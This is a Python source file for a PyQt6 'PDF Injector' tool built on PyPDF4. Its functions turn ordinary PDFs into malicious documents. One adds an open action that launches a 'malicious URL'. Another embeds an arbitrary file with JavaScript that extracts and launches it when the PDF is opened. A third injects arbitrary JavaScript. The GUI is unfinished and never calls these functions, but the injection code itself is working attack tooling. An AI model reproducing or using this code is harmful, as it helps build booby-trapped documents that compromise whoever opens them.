import sys
import os
import PyPDF4
from PyPDF4.generic import (
    DictionaryObject,
    NameObject,
    TextStringObject,
    EncodedStreamObject,
    ArrayObject,
)

from PyQt6.QtWidgets import (
    QApplication,
    QMainWindow,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QRadioButton,
    QFileDialog,
    QWidget,
    QPlainTextEdit,
    QMessageBox,
    QGroupBox,
    QInputDialog,
)
from PyQt6.QtCore import Qt

# Dictionary with JavaScript payloads
js_payloads = {
    "Alert Box": "app.alert('This is an alert box.');",
    # Add other payloads here...
}

def inject_url(input_pdf, output_pdf, malicious_url):
    """Inject a malicious URL to a PDF."""
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        # Set OpenAction to launch the malicious URL when the PDF is opened
        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/URI"),
            NameObject("/URI"): TextStringObject(malicious_url)
        })

        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})

        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

def inject_file(input_pdf, output_pdf, file_to_inject):
    """Inject a file into the PDF."""
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.pages[i])

        with open(file_to_inject, "rb") as file_inject:
            file_data = file_inject.read()

        ef_stream = EncodedStreamObject()
        ef_stream._data = file_data
        ef_stream.update({
            NameObject("/Type"): NameObject("/EmbeddedFile"),
            NameObject("/Filter"): NameObject("/ASCIIHexDecode")
        })

        file_name = TextStringObject(os.path.basename(file_to_inject))
        embedded_file = pdf_writer._addObject(ef_stream)
        filespec = DictionaryObject({
            NameObject("/Type"): NameObject("/Filespec"),
            NameObject("/F"): file_name,
            NameObject("/EF"): DictionaryObject({NameObject("/F"): embedded_file})
        })
        filespec_obj = pdf_writer._addObject(filespec)

        js_code = f"""
        var filePath = this.path.replace(/[^\\/]+$/, '');
        var fileName = '{file_name}';
        this.exportDataObject({{ cName: fileName, nLaunch: 2 }});
        """

        js_text_string = TextStringObject(js_code)
        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): js_text_string
        })

        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})
        pdf_writer._root_object["/Names"] = pdf_writer._root_object.get("/Names", DictionaryObject())
        embedded_files = pdf_writer._root_object["/Names"].setdefault(NameObject("/EmbeddedFiles"), DictionaryObject())
        embedded_files.setdefault(NameObject("/Names"), ArrayObject()).extend([file_name, filespec_obj])

        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

def inject_js(input_pdf, output_pdf, js_code):
    """Inject JavaScript code into the PDF."""
    with open(input_pdf, "rb") as file:
        pdf_reader = PyPDF4.PdfFileReader(file)
        pdf_writer = PyPDF4.PdfFileWriter()

        for i in range(len(pdf_reader.pages)):
            pdf_writer.addPage(pdf_reader.getPage(i))

        js_text_string = TextStringObject(js_code)
        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): js_text_string
        })

        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})

        with open(output_pdf, "wb") as output_file:
            pdf_writer.write(output_file)

class MainWindow(QMainWindow):
    """Main window for the PDF Injector."""
    
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("PDF Injector")
        main_layout = QVBoxLayout()

        form_widget = QWidget()
        form_widget.setLayout(main_layout)
        self.setCentralWidget(form_widget)

        input_layout = QHBoxLayout()
        input_label = QLabel("Input PDF:")
        self.input_line_edit = QLineEdit()
        input_browse_button = QPushButton("Browse")
        input_browse_button.clicked.connect(self.browse_input)
        input_layout.addWidget(input_label)
        input_layout.addWidget(self.input_line_edit)
        input_layout.addWidget(input_browse_button)

        output_layout = QHBoxLayout()
        output_label = QLabel("Output PDF:")
        self.output_line_edit = QLineEdit()
        output_browse_button = QPushButton("Browse")
        output_browse_button.clicked.connect(self.browse_output)
        output_layout.addWidget(output_label)
        output_layout.addWidget(self.output_line_edit)
        output_layout.addWidget(output_browse_button)

        radio_group_box = QGroupBox("Injection Method")
        radio_layout = QHBoxLayout()
        radio_group_box.setLayout(radio_layout)
        self.url_radio_button = QRadioButton("Inject URL")
        self.file_radio_button = QRadioButton("Inject File")
        self.js_radio_button = QRadioButton("Inject JavaScript")
        radio_layout.addWidget(self.url_radio_button)
        radio_layout.addWidget(self.file_radio_button)
        radio_layout.addWidget(self.js_radio_button)

        main_layout.addLayout(input_layout)
        main_layout.addLayout(output_layout)
        main_layout.addWidget(radio_group_box)

    def browse_input(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Open Input PDF", "", "PDF Files (*.pdf)")
        self.input_line_edit.setText(file_name)
    
    def browse_output(self):
        file_name, _ = QFileDialog.getSaveFileName(self, "Save Output PDF", "", "PDF Files (*.pdf)")
        self.output_line_edit.setText(file_name)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec())
